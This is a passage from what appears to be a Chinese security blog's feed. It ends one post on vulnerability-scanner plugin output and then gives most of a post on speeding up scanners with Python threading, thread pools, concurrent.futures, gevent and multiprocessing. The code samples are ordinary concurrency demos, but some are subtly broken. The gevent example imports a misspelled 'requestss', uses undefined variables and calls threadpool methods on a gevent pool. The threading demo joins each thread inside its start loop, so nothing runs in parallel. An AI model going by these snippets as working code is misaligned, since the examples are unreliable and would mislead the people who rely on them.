&lt;p&gt;在整合网上搜集来的插件时，由于各结果的返回格式不是很好统一，有的整合型框架为了兼容会直接简单处理下，就糅合在一起存储和输出了。
其实这也没啥，只要入库的时候，将特殊字符等问题处理好，做好插件漏洞的信息粗放分类标注，那就基本OK了。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;单体输出&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;某些作者单独开发的框架，是直接省略了存储这一环节的，或者是提供了选项，默认不开启的。
这时候，插件验证如果成功，会直接把信息反馈输出到命令行里。如果在验证单体漏洞或者单个目标的时候，这样做还是比较有效率的。&lt;/p&gt;

&lt;h3 id=&quot;结语&quot;&gt;结语&lt;/h3&gt;

&lt;p&gt;上面列举的案例分析代码，部分改编于Github上搜到的漏洞利用框架，部分来自于笔者自己的储备，这里再次感谢各位大佬的开源。&lt;/p&gt;</content><author><name>HellSec</name></author><category term="scanner" /><summary type="html">在我们试图构建漏扫系统的时候，调整好插件的配置和格式，能更有效地帮助我们进行漏洞探测，以及提升对bug的进行fuzz的高效性。</summary></entry><entry><title type="html">浅谈漏扫之加速篇</title><link href="/scanner/2018/09/03/scanner-faster/" rel="alternate" type="text/html" title="浅谈漏扫之加速篇" /><published>2018-09-03T12:48:18+08:00</published><updated>2018-09-03T12:48:18+08:00</updated><id>/scanner/2018/09/03/scanner-faster</id><content type="html" xml:base="/scanner/2018/09/03/scanner-faster/">&lt;p&gt;
	&lt;span style=&quot;color:#DAA520;&quot;&gt;&lt;strong&gt;众所周知，在渗透测试中，除了内网和敏感线上环境，我们会尽可能用上高效的扫描器。虽然说打造扫描神器主要是靠规则和POC，不过它们也需要稳定而健壮的引擎，这就不得不谈到如何有效地对单线程脚本进行加速了。&lt;/strong&gt;&lt;/span&gt;
&lt;/p&gt;

&lt;p&gt;为了方便描述，笔者这里会拿python的库来举例，部分代码采集自网络。本文会向大家简要评析一些能加快扫描速率的库。希望借此帮大家规避掉一些坑，很多点也是具有普适性的。&lt;/p&gt;

&lt;h3 id=&quot;线程&quot;&gt;线程&lt;/h3&gt;

&lt;h4 id=&quot;多线程&quot;&gt;多线程&lt;/h4&gt;

&lt;p&gt;示例：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;threading&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;用法比较简单，普通速成小脚本建议用这个库，比如在扫描主机存活或者探测URL路径是否存在的时候。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#coding:utf-8
import threading
import time

def action(arg):
    time.sleep(1)
    print  'sub thread start!the thread name is:%s    ' % threading.currentThread().getName()
    print 'the arg is:%s   ' %arg
    time.sleep(1)


for i in xrange(4):
    t =threading.Thread(target=action,args=(i,))
    t.setDaemon(True)
    t.start()
    t.join()

print 'main_thread end!'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;thread&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;有的朋友可能会问，有没有更简单的，老夫不懂那么多，只想一把梭！
当然有，很早以前笔者也曾喜欢使用这个库：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#coding=gbk
import thread, time, random
count = 0
def threadTest():
    global count
    for i in xrange(10000):
        count += 1
for i in range(10):
    thread.start_new_thread(threadTest, ())	
time.sleep(3)
print count	
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;不过thread.start_new_thread有个比较明显的缺点，因为起了新线程是不好控制的，一旦任务挂起过多，会占用较多的机器资源，所以建议在检测目标量不大的时候使用。&lt;/p&gt;

&lt;h4 id=&quot;线程池&quot;&gt;线程池&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;threadpool&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;说实在这库还是比较好用的，在无序输出结果等情况下比较稳健，尤其是它在win平台下兼容性是比较好的。
不过需要注意，就是如果不加锁的话，需要先做数据聚合。直接按序写入文件，或者直接入库的话，数据会乱掉。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import time
import threadpool  
def sayhello(str):
    print &quot;Hello &quot;,str
    time.sleep(2)

name_list =['xiaozi','aa','bb','cc']
start_time = time.time()
pool = threadpool.ThreadPool(10) 
requests = threadpool.makeRequests(sayhello, name_list) 
[pool.putRequest(req) for req in requests] 
pool.wait() 
print '%d second'% (time.time()-start_time)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;concurrent.futures&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;该库是python 3.x自带的，但python 2.x也能用，相对来说会比threadpool更优化的多一些，毕竟新库嘛。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#! /usr/bin/env python&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;concurrent.futures&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ThreadPoolExecutor&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sayhello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;hello: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;b&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;start1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sayhello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;end1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;time1: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;end1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#submit提交&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;start2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ThreadPoolExecutor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;executor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;executor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sayhello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;each&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;end2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;time2: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;end2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;c&quot;&gt;#map提交&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;start3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ThreadPoolExecutor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;executor1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;executor1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sayhello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;end3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;time3: &quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;end3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;我们可以看看上面的代码注释，其中submit和map的区别在于：&lt;/p&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;map可以保证输出的顺序, submit输出的顺序是乱的。&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;如果你要提交的任务的函数是一样的，就可以简化成map。但是假如提交的任务函数是不一样的，或者执行的过程之可能出现异常（使用map执行过程中发现问题会直接抛出错误）就要用到submit。&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;ol&gt;
    &lt;li&gt;submit和map的参数是不同的，submit每次都需要提交一个目标函数和对应的参数，map只需要提交一次目标函数，目标函数的参数放在一个迭代器（列表，字典）里就可以。&lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;协程&quot;&gt;协程&lt;/h3&gt;

&lt;p&gt;协程算是一种用户级别的轻量级线程，调度较线程会麻烦一些，但因为开销减少提升了性能。&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;gevent&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这个就是熟面孔了，许多经典爬虫都会用到这个库，在linux下贼好用的。不过因为依赖库的问题，让它在win下总是出现greenlet等库的版本和依赖问题。&lt;/p&gt;

&lt;p&gt;不过比之线程池的threadpool，这个不加锁时也不用担心乱序问题。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from gevent import monkey
monkey.patch_all()
from gevent.pool import Pool
import requestss

def detect(url):
    try:
        r = requests.get(url,  headers= headers ,timeout = timeout ,verify = False)
    except Exception,e:
        return

pool = Pool(20)#协程数
pool.map(detect, urls)
[pool.putRequest(req) for req in reqs]
pool.wait()

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;其他协程库&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;另外，其他实现协程的库还是蛮多的，这里不方便列举，有兴趣的朋友可以搜搜。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;asyncio&lt;/li&gt;
  &lt;li&gt;tornado&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;进程&quot;&gt;进程&lt;/h3&gt;

&lt;p&gt;进程间的切换，会消耗较多的资源和时间，一般会配合多线程/协程使用，叠加对任务进行分发。&lt;/p&gt;

&lt;p&gt;下面我们来看几个案例：&lt;/p&gt;

&lt;h4 id=&quot;多进程&quot;&gt;多进程&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;fork&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;教科书式的的案例，曾收录在不少经典编程书籍里：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/env python&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Process (&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s) start...'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fork&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'I am child process (&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s) and my parent is &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s.'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getppid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'I (&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s) just created a child process (&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s).'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;multiprocessing的多进程&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/env python&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;multiprocessing&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Process&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;run_proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Run child process &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s (&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s)...'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'__main__'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Parent process &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s.'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getpid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;processes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run_proc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'test'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Process will start.'&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;processes&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;processes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Process end.'&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;multiprocessing下的多线程&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在multiprocessing下也有个多线程模块,通过async_result.get()可以获取结果。&lt;/p&gt;

&lt;p&gt;multiprocessing也能实现多线程，它有两个多线程的入口，一个是 dummy Pool：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# -*- coding: utf-8 -*-
# from multiprocessing import Pool 多进程
from multiprocessing.dummy import Pool as ThreadPool #多线程
import time
import urllib2
 
urls = [
    'http://www.python.org', 
    'http://www.python.org/about/',
    'http://www.onlamp.com/pub/a/python/2003/04/17/metaclasses.html',
    ]
 
# 单线程
start = time.time()
results = map(urllib2.urlopen, urls)
print 'Normal:', time.time() - start
 
# 多线程
start2 = time.time()
# 开4个 worker，没有参数时默认是 cpu 的核心数
pool = ThreadPool(4)
# 在线程中执行 urllib2.urlopen(url) 并返回执行结果
results2 = pool.map(urllib2.urlopen, urls)
pool.close()
pool.join()
print 'Thread Pool:', time.time() - start2

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;另一个是pool.ThreadPool：&lt;/p&gt;
